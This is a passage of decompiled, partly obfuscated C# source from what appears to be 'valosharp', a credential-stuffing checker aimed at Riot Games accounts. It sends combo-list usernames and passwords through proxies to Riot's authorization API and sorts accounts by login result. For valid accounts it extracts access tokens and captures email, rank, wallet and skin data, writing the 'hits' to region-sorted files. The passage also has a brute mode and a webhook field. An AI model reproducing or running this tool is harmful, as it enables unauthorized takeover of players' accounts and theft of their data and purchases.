							httpRequest.AddHeader(HttpHeader.UserAgent, "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko");
							httpRequest.AddHeader(HttpHeader.Accept, "*/*");
							HttpResponse httpResponse = CheckerHelper.HandleRequest(httpRequest, HttpMethod.POST, new Uri("https://auth.riotgames.com/api/v1/authorization"), new StringContent("{\"acr_values\":\"urn:riot:bronze\",\"claims\":\"\",\"client_id\":\"riot-client\",\"nonce\":\"oYnVwCSrlS5IHKh7iI17oQ\",\"redirect_uri\":\"http://localhost/redirect\",\"response_type\":\"token id_token\",\"scope\":\"openid link ban lol_region\"}")
							{
								ContentType = "application/json"
							});
							if (!httpResponse.ToString().Contains("error"))
							{
								HttpResponse httpResponse2 = CheckerHelper.HandleRequest(httpRequest, HttpMethod.PUT, new Uri("https://auth.riotgames.com/api/v1/authorization"), new StringContent(string.Concat(new string[]
								{
									"{\"Content-Type\":\"application/json\",\"type\":\"auth\",\"username\": \"",
									array[0],
									"\", \"password\": \"",
									array[1],
									"\"}"
								}))
								{
									ContentType = "application/json"
								});
								string text2 = httpResponse2.ToString();
								if (text2.Contains("error"))
								{
									if (!text2.Contains("invalid_session_id"))
									{
										if (text2.Contains("archived_account"))
										{
											CheckerHelper.CPM_aux++;
											if (!CheckerHelper.archived_accounts.Any(new Func<string, bool>(text.Contains)))
											{
												CheckerHelper.archived_accounts.Add(text);
											}
										}
										else if (!text2.Contains("auth_failure"))
										{
											if (text2.Contains("server_error"))
											{
											}
										}
										else
										{
											CheckerHelper.CPM_aux++;
											if (!CheckerHelper.invalid_accounts.Any(new Func<string, bool>(text.Contains)))
											{
												CheckerHelper.invalid_accounts.Add(text);
											}
										}
									}
								}
								else
								{
									string access_token = new Regex("(?:access_token=)((?:[a-zA-Z]|\\d|\\.|-|_)*)").Match(httpResponse2.ToString()).ToString().Split(new char[]
									{
										'='
									})[1];
									CheckerHelper.CPM_aux++;
									if (!CheckerHelper.valid_accounts.Any(new Func<string, bool>(text.Contains)))
									{
										CheckerHelper.valid_accounts.Add(text);
									}
									if (!CheckerHelper.brute_mode)
									{
										CheckerHelper.Capture(httpRequest, access_token, array);
									}
									else
									{
										CheckerHelper.check++;
									}
								}
							}
							else
							{
								string text3 = httpResponse.ToString();
								if (text3.Contains("rate_limited"))
								{
									num++;
								}
								else
								{
									text3.Contains("invalid_session_id");
								}
							}
						}
					}
					continue;
				}
				catch
				{
					Interlocked.Increment(ref CheckerHelper.err);
					continue;
				}
				break;
			}
		}

		// Token: 0x06000026 RID: 38 RVA: 0x00006F60 File Offset: 0x00005160
		public static void SaveCapture()
		{
			string currentDirectory = Environment.CurrentDirectory;
			File.WriteAllText(currentDirectory + "/Hits/" + CheckerHelper.datetime_now_to_string + "/Capture/FULL_CAPTURE.txt", CheckerHelper.credits + string.Join("\n", CheckerHelper.full_captures));
			foreach (KeyValuePair<string, Dictionary<string, List<string>>> keyValuePair in CheckerHelper.filter_accounts_ranked_ready["Unverified"])
			{
				File.WriteAllText(string.Concat(new string[]
				{
					currentDirectory,
					"/Hits/",
					CheckerHelper.datetime_now_to_string,
					"/Regions",
					keyValuePair.Key.ToUpper(),
					"/Ranked_Ready/Unverified/FULL_CAPTURE.txt"
				}), CheckerHelper.credits + string.Join("\n", keyValuePair.Value["FULL_CAPTURE"]));
				File.WriteAllText(string.Concat(new string[]
				{
					currentDirectory,
					"/Hits/",
					CheckerHelper.datetime_now_to_string,
					"/Regions",
					keyValuePair.Key.ToUpper(),
					"/Ranked_Ready/Unverified/RAW.txt"
				}), CheckerHelper.credits + string.Join("\n", keyValuePair.Value["RAW"]));
			}
			foreach (KeyValuePair<string, List<string>> keyValuePair2 in CheckerHelper.filter_accounts_capture)
			{
				File.WriteAllText(string.Concat(new string[]
				{
					currentDirectory,
					"/Hits/",
					CheckerHelper.datetime_now_to_string,
					"/Regions/",
					keyValuePair2.Key.ToUpper(),
					"/FULL_CAPTURE.txt"
				}), CheckerHelper.credits + string.Join("\n", keyValuePair2.Value));
			}
			foreach (KeyValuePair<string, List<string>> keyValuePair3 in CheckerHelper.filter_accounts_raw)
			{
				File.WriteAllText(string.Concat(new string[]
				{
					currentDirectory,
					"/Hits/",
					CheckerHelper.datetime_now_to_string,
					"/Regions/",
					keyValuePair3.Key.ToUpper(),
					"/VALIDS.txt"
				}), CheckerHelper.credits + string.Join("\n", keyValuePair3.Value));
			}
			foreach (KeyValuePair<string, Dictionary<string, List<string>>> keyValuePair4 in CheckerHelper.filter_accounts_ranked_ready["Verified"])
			{
				File.WriteAllText(string.Concat(new string[]
				{
					currentDirectory,
					"/Hits/",
					CheckerHelper.datetime_now_to_string,
					"/Regions",
					keyValuePair4.Key.ToUpper(),
					"/Ranked_Ready/Verified/FULL_CAPTURE.txt"
				}), CheckerHelper.credits + string.Join("\n", keyValuePair4.Value["FULL_CAPTURE"]));
				File.WriteAllText(string.Concat(new string[]
				{
					currentDirectory,
					"/Hits/",
					CheckerHelper.datetime_now_to_string,
					"/Regions",
					keyValuePair4.Key.ToUpper(),
					"/Ranked_Ready/Verified/RAW.txt"
				}), CheckerHelper.credits + string.Join("\n", keyValuePair4.Value["RAW"]));
			}
		}

		// Token: 0x06000027 RID: 39 RVA: 0x00007314 File Offset: 0x00005514
		public static void CreateFolders()
		{
			string currentDirectory = Environment.CurrentDirectory;
			foreach (string path in new List<string>
			{
				currentDirectory + "/Hits",
				currentDirectory + "/Hits/" + CheckerHelper.datetime_now_to_string,
				currentDirectory + "/Hits/" + CheckerHelper.datetime_now_to_string + "/Capture",
				currentDirectory + "/Hits/" + CheckerHelper.datetime_now_to_string + "/Regions",
				currentDirectory + "/Hits/" + CheckerHelper.datetime_now_to_string + "/Regions/EU",
				currentDirectory + "/Hits/" + CheckerHelper.datetime_now_to_string + "/Regions/NA",
				currentDirectory + "/Hits/" + CheckerHelper.datetime_now_to_string + "/Regions/AP",
				currentDirectory + "/Hits/" + CheckerHelper.datetime_now_to_string + "/Regions/KR",
				currentDirectory + "/Hits/" + CheckerHelper.datetime_now_to_string + "/Regions/EU/Ranked",
				currentDirectory + "/Hits/" + CheckerHelper.datetime_now_to_string + "/Regions/NA/Ranked",
				currentDirectory + "/Hits/" + CheckerHelper.datetime_now_to_string + "/Regions/AP/Ranked",
				currentDirectory + "/Hits/" + CheckerHelper.datetime_now_to_string + "/Regions/KR/Ranked",
				currentDirectory + "/Hits/" + CheckerHelper.datetime_now_to_string + "/Regions/EU/Skinned",
				currentDirectory + "/Hits/" + CheckerHelper.datetime_now_to_string + "/Regions/NA/Skinned",
				currentDirectory + "/Hits/" + CheckerHelper.datetime_now_to_string + "/Regions/AP/Skinned",
				currentDirectory + "/Hits/" + CheckerHelper.datetime_now_to_string + "/Regions/KR/Skinned",
				currentDirectory + "/Hits/" + CheckerHelper.datetime_now_to_string + "/Regions/EU/Ranked_Ready",
				currentDirectory + "/Hits/" + CheckerHelper.datetime_now_to_string + "/Regions/NA/Ranked_Ready",
				currentDirectory + "/Hits/" + CheckerHelper.datetime_now_to_string + "/Regions/AP/Ranked_Ready",
				currentDirectory + "/Hits/" + CheckerHelper.datetime_now_to_string + "/Regions/KR/Ranked_Ready",
				currentDirectory + "/Hits/" + CheckerHelper.datetime_now_to_string + "/Regions/EU/Ranked_Ready/Verified",
				currentDirectory + "/Hits/" + CheckerHelper.datetime_now_to_string + "/Regions/NA/Ranked_Ready/Verified",
				currentDirectory + "/Hits/" + CheckerHelper.datetime_now_to_string + "/Regions/AP/Ranked_Ready/Verified",
				currentDirectory + "/Hits/" + CheckerHelper.datetime_now_to_string + "/Regions/KR/Ranked_Ready/Verified",
				currentDirectory + "/Hits/" + CheckerHelper.datetime_now_to_string + "/Regions/EU/Ranked_Ready/Unverified",
				currentDirectory + "/Hits/" + CheckerHelper.datetime_now_to_string + "/Regions/NA/Ranked_Ready/Unverified",
				currentDirectory + "/Hits/" + CheckerHelper.datetime_now_to_string + "/Regions/AP/Ranked_Ready/Unverified",
				currentDirectory + "/Hits/" + CheckerHelper.datetime_now_to_string + "/Regions/KR/Ranked_Ready/Unverified"
			})
			{
				if (!Directory.Exists(path))
				{
					Directory.CreateDirectory(path);
				}
			}
		}

		// Token: 0x06000028 RID: 40 RVA: 0x00002354 File Offset: 0x00000554
		private static string Parse(string source, string left, string right)
		{
			return source.Split(new string[]
			{
				left
			}, StringSplitOptions.None)[1].Split(new string[]
			{
				right
			}, StringSplitOptions.None)[0];
		}

		// Token: 0x06000029 RID: 41 RVA: 0x0000237B File Offset: 0x0000057B
		public CheckerHelper()
		{
			Class1.MF9OXz();
		}

		// Token: 0x0600002A RID: 42 RVA: 0x0000765C File Offset: 0x0000585C
		static CheckerHelper()
		{
			Class1.MF9OXz();
			CheckerHelper.proxy_timeout = 5000;
			CheckerHelper.check = 0;
			CheckerHelper.hits = 0;
			CheckerHelper.err = 0;
			CheckerHelper.bad = 0;
			CheckerHelper.accindex = 0;
			CheckerHelper.retries = 0;
			CheckerHelper.ratelimits = 0;
			CheckerHelper.skip_banned_accounts = true;
			CheckerHelper.capture_email = true;
			CheckerHelper.capture_xp = true;
			CheckerHelper.capture_last_played_match = true;
			CheckerHelper.capture_rank = true;
			CheckerHelper.capture_wallet = true;
			CheckerHelper.brute_mode = false;
			CheckerHelper.webhook_url = "";
			CheckerHelper.regions = new List<string>
			{
				"eu",
				"na",
				"ap",
				"kr"
			};
			CheckerHelper.proxies = new List<string>();
			CheckerHelper.accounts = new List<string>();
			CheckerHelper.checked_accounts = new List<string>();
			CheckerHelper.valid_accounts = new List<string>();
			CheckerHelper.invalid_accounts = new List<string>();
			CheckerHelper.archived_accounts = new List<string>();
			CheckerHelper.multifactor_accounts = new List<string>();
			CheckerHelper.banned_accounts = new List<string>();
			CheckerHelper.full_captures = new List<string>();
			CheckerHelper.captured_combos = new List<string>();
			CheckerHelper.proxytype = "";
			CheckerHelper.gui_type = "CUI";
			CheckerHelper.proxytotal = 0;
			CheckerHelper.stop = 0;
			CheckerHelper.CPM = 0;
			CheckerHelper.CPM_aux = 0;
			CheckerHelper.seconds_gone = 1;
			CheckerHelper.credits = "Checked with valosharp: https://t.me/valosharp \n\n";
			CheckerHelper.datetime_now_to_string = DateTime.UtcNow.ToString("yyyy-MM-dd HH-mm-ss");
			CheckerHelper.capture_process = new List<string>();
			CheckerHelper.filter_accounts_capture = new Dictionary<string, List<string>>
			{
				{
					"eu",
					new List<string>()
				},
				{
					"na",
					new List<string>()
				},
				{
					"ap",
					new List<string>()
				},
				{
					"kr",
					new List<string>()
				}
			};
			CheckerHelper.filter_accounts_raw = new Dictionary<string, List<string>>
			{
				{
					"eu",
					new List<string>()
				},
				{
					"na",
					new List<string>()
				},
				{
					"ap",
					new List<string>()
				},
				{
					"kr",
					new List<string>()
				}
			};
			CheckerHelper.filter_accounts_skins = new Dictionary<string, Dictionary<string, int>>
			{
				{
					"0",
					new Dictionary<string, int>()
				},
				{
					"1-10",
					new Dictionary<string, int>()
				},
				{
					"11-20",
					new Dictionary<string, int>()
				},
				{
					"21-30",
					new Dictionary<string, int>()
				},
				{
					"31-40",
					new Dictionary<string, int>()
				},
				{
					"41-50",
					new Dictionary<string, int>()
				},
				{
					"51-80",
					new Dictionary<string, int>()
				},
				{
					"81-100",
					new Dictionary<string, int>()
				},
				{
					"101-150",
					new Dictionary<string, int>()
				},
				{
					"151-200",
					new Dictionary<string, int>()
				},
				{
					"200+",
					new Dictionary<string, int>()
				}
			};
			CheckerHelper.filter_accounts_ranks = new Dictionary<string, Dictionary<string, Dictionary<string, int>>>
			{
				{
					"Unknown",
					new Dictionary<string, Dictionary<string, int>>()
				},
				{
					"Unranked",
					new Dictionary<string, Dictionary<string, int>>()
				},
				{
					"Iron",
					new Dictionary<string, Dictionary<string, int>>()
				},
				{
					"Bronze",
					new Dictionary<string, Dictionary<string, int>>()
				},
				{
					"Silver",
					new Dictionary<string, Dictionary<string, int>>()
				},
				{
					"Gold",
					new Dictionary<string, Dictionary<string, int>>()
				},
				{
					"Platinum",
					new Dictionary<string, Dictionary<string, int>>()
				},
				{
					"Diamond",
					new Dictionary<string, Dictionary<string, int>>()
				},
				{
					"Immortal",
					new Dictionary<string, Dictionary<string, int>>()
				},
				{
					"Radiant",
					new Dictionary<string, Dictionary<string, int>>()
				}
			};
			CheckerHelper.filter_accounts_ranked_ready = new Dictionary<string, Dictionary<string, Dictionary<string, List<string>>>>
			{
				{
					"Verified",
					new Dictionary<string, Dictionary<string, List<string>>>
					{
						{
							"eu",
							new Dictionary<string, List<string>>
							{
								{
									"FULL_CAPTURE",
									new List<string>()
								},
								{
									"RAW",
									new List<string>()
								}
							}
						},
						{
							"na",
							new Dictionary<string, List<string>>
							{
								{
									"FULL_CAPTURE",
									new List<string>()
								},
								{
									"RAW",
									new List<string>()
								}
							}
						},
						{
							"ap",
							new Dictionary<string, List<string>>
							{
								{
									"FULL_CAPTURE",
									new List<string>()
								},
								{
									"RAW",
									new List<string>()
								}
							}
						},
						{
							"kr",
							new Dictionary<string, List<string>>
							{
								{
									"FULL_CAPTURE",
									new List<string>()
								},
								{
									"RAW",
									new List<string>()
								}
							}
						}
					}
				},
				{
					"Unverified",
					new Dictionary<string, Dictionary<string, List<string>>>
					{
						{
							"eu",
							new Dictionary<string, List<string>>
							{
								{
									"FULL_CAPTURE",
									new List<string>()
								},
								{
									"RAW",
									new List<string>()
								}
							}
						},
						{
							"na",
							new Dictionary<string, List<string>>
							{
								{
									"FULL_CAPTURE",
									new List<string>()
								},
								{
									"RAW",
									new List<string>()
								}
							}
						},
						{
							"ap",
							new Dictionary<string, List<string>>
							{
								{
									"FULL_CAPTURE",
									new List<string>()
								},
								{
									"RAW",
									new List<string>()
								}
							}
						},
						{
							"kr",
							new Dictionary<string, List<string>>
							{
								{
									"FULL_CAPTURE",
									new List<string>()
								},
								{
									"RAW",
									new List<string>()
								}
							}
						}
					}
				}
			};
		}

		// Token: 0x0600002B RID: 43 RVA: 0x00002388 File Offset: 0x00000588
		internal static bool QuL()
		{
			return CheckerHelper.GuD == null;
		}

		// Token: 0x0600002C RID: 44 RVA: 0x0000231C File Offset: 0x0000051C
		internal static void Jug()
		{
		}

		// Token: 0x04000005 RID: 5
		public static string combo_list_filename;

		// Token: 0x04000006 RID: 6
		public static string proxy_list_filename;

		// Token: 0x04000007 RID: 7
		public static JToken api_skins;

		// Token: 0x04000008 RID: 8
		public static JObject api_version;

		// Token: 0x04000009 RID: 9
		public static int proxy_timeout;

		// Token: 0x0400000A RID: 10
		public static int check;

		// Token: 0x0400000B RID: 11
		public static int hits;

		// Token: 0x0400000C RID: 12
		public static int err;

		// Token: 0x0400000D RID: 13
		public static int bad;

		// Token: 0x0400000E RID: 14
		public static int accindex;

		// Token: 0x0400000F RID: 15
		public static int retries;

		// Token: 0x04000010 RID: 16
		public static int ratelimits;

		// Token: 0x04000011 RID: 17
		public static bool skip_banned_accounts;

		// Token: 0x04000012 RID: 18
		public static bool capture_email;

		// Token: 0x04000013 RID: 19
		public static bool capture_xp;

		// Token: 0x04000014 RID: 20
		public static bool capture_last_played_match;

		// Token: 0x04000015 RID: 21
		public static bool capture_rank;

		// Token: 0x04000016 RID: 22
		public static bool capture_wallet;

		// Token: 0x04000017 RID: 23
		public static bool brute_mode;

		// Token: 0x04000018 RID: 24
		public static string webhook_url;

		// Token: 0x04000019 RID: 25
		public static List<string> regions;

		// Token: 0x0400001A RID: 26
		public static List<string> proxies;

		// Token: 0x0400001B RID: 27
		public static List<string> accounts;

		// Token: 0x0400001C RID: 28
		public static List<string> checked_accounts;

		// Token: 0x0400001D RID: 29
		public static List<string> valid_accounts;

		// Token: 0x0400001E RID: 30
		public static List<string> invalid_accounts;

		// Token: 0x0400001F RID: 31
		public static List<string> archived_accounts;

		// Token: 0x04000020 RID: 32
		public static List<string> multifactor_accounts;

		// Token: 0x04000021 RID: 33
		public static List<string> banned_accounts;

		// Token: 0x04000022 RID: 34
		public static List<string> full_captures;

		// Token: 0x04000023 RID: 35
		public static List<string> captured_combos;

		// Token: 0x04000024 RID: 36
		public static string proxytype;

		// Token: 0x04000025 RID: 37
		public static string gui_type;

		// Token: 0x04000026 RID: 38
		public static int proxytotal;

		// Token: 0x04000027 RID: 39
		public static int stop;

		// Token: 0x04000028 RID: 40
		public static int CPM;

		// Token: 0x04000029 RID: 41
		public static int CPM_aux;

		// Token: 0x0400002A RID: 42
		public static int seconds_gone;

		// Token: 0x0400002B RID: 43
		public static int total;

		// Token: 0x0400002C RID: 44
		public static int threads;

		// Token: 0x0400002D RID: 45
		public static string credits;

		// Token: 0x0400002E RID: 46
		public static string datetime_now_to_string;

		// Token: 0x0400002F RID: 47
		public static List<string> capture_process;

		// Token: 0x04000030 RID: 48
		public static Dictionary<string, List<string>> filter_accounts_capture;

		// Token: 0x04000031 RID: 49
		public static Dictionary<string, List<string>> filter_accounts_raw;

		// Token: 0x04000032 RID: 50
		public static Dictionary<string, Dictionary<string, int>> filter_accounts_skins;

		// Token: 0x04000033 RID: 51
		public static Dictionary<string, Dictionary<string, Dictionary<string, int>>> filter_accounts_ranks;

		// Token: 0x04000034 RID: 52
		public static Dictionary<string, Dictionary<string, Dictionary<string, List<string>>>> filter_accounts_ranked_ready;

		// Token: 0x04000035 RID: 53
		internal static CheckerHelper GuD;
	}
}
